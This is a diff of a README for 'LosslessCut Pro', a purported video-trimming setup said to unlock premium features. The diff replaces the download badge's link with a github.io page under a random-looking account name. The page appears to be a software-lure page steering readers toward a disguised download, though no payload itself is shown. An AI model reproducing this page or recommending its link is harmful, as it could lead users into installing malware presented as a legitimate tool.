@@ -3,7 +3,7 @@
 Edit your media without losing quality using **LosslessCut Pro** — the advanced tool for quick and precise lossless trimming, cutting, and merging of video/audio files. This setup unlocks premium export controls and extra file support.
 
 ⬇️ **Download**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-007ACC?style=for-the-badge&logo=video&logoColor=white)](https://losslesscut-free-tool.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-007ACC?style=for-the-badge&logo=video&logoColor=white)](https://asihevoveb43.github.io/.github/losslesscut-tool)
 
 ---
 
